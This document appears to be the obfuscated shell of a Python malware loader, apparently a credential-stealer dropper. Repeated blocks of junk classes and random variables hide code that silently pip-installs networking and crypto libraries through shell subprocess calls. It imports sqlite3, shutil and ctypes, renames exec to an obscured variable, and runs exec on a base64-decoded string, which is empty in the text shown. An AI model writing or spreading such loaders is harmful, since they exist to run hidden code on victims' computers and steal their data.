

from sys import executable, stderr
class gNi1YDYqwe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
opFQThcHwv = 25295809
bn87LzNsgA = 91310627
class wFFWuLSFOL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'WqfazwH', 'age': 39}
class dhrVa0XQ8n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXqKb37qIl = 96726329
IncF3I0aOJ = 10751505
class muJbG7Fqbi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
JSI3w8hwBK = 76293440
olkpYjblU9 = 94466069
YINaPn1Yqf = 56672329
nu2ALedY7i = 51815184
yOx9RE0xUU = 85314966
class EgYpR6ylwf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BeliLA7ReB = 19003474
class EsEmEcpWEs:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'JrXTUerdh5'"]
class Zwc9ONQBir:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uMjM2uL6Ia:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'q4OPCk7SrB'
class sf4AvOwWgw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class yHBNNsG37u:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class gNi1YDYqwe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
opFQThcHwv = 25295809
bn87LzNsgA = 91310627
class wFFWuLSFOL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'WqfazwH', 'age': 39}
class dhrVa0XQ8n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXqKb37qIl = 96726329
IncF3I0aOJ = 10751505
class muJbG7Fqbi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
JSI3w8hwBK = 76293440
olkpYjblU9 = 94466069
YINaPn1Yqf = 56672329
nu2ALedY7i = 51815184
yOx9RE0xUU = 85314966
class EgYpR6ylwf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BeliLA7ReB = 19003474
class EsEmEcpWEs:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'JrXTUerdh5'"]
class Zwc9ONQBir:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uMjM2uL6Ia:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'q4OPCk7SrB'
class sf4AvOwWgw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class yHBNNsG37u:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
nNGVMEL5IyzGLMGLqHfEUJoeBuqQzhh8rsonfV = exec
class gNi1YDYqwe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
opFQThcHwv = 25295809
bn87LzNsgA = 91310627
class wFFWuLSFOL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'WqfazwH', 'age': 39}
class dhrVa0XQ8n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXqKb37qIl = 96726329
IncF3I0aOJ = 10751505
class muJbG7Fqbi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
JSI3w8hwBK = 76293440
olkpYjblU9 = 94466069
YINaPn1Yqf = 56672329
nu2ALedY7i = 51815184
yOx9RE0xUU = 85314966
class EgYpR6ylwf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BeliLA7ReB = 19003474
class EsEmEcpWEs:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'JrXTUerdh5'"]
class Zwc9ONQBir:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uMjM2uL6Ia:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'q4OPCk7SrB'
class sf4AvOwWgw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class yHBNNsG37u:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import concurrent.futures
KCbFwwHfhkS3GjcCIOquIIuef6XbWSoop3pzZ6=""
nNGVMEL5IyzGLMGLqHfEUJoeBuqQzhh8rsonfV(base64.b64decode(KCbFwwHfhkS3GjcCIOquIIuef6XbWSoop3pzZ6))
class gNi1YDYqwe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
opFQThcHwv = 25295809
bn87LzNsgA = 91310627
class wFFWuLSFOL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'WqfazwH', 'age': 39}
class dhrVa0XQ8n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXqKb37qIl = 96726329
IncF3I0aOJ = 10751505
class muJbG7Fqbi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
JSI3w8hwBK = 76293440
olkpYjblU9 = 94466069
YINaPn1Yqf = 56672329
nu2ALedY7i = 51815184
yOx9RE0xUU = 85314966
class EgYpR6ylwf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BeliLA7ReB = 19003474
class EsEmEcpWEs:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'JrXTUerdh5'"]
class Zwc9ONQBir:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uMjM2uL6Ia:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'q4OPCk7SrB'
class sf4AvOwWgw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class yHBNNsG37u:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
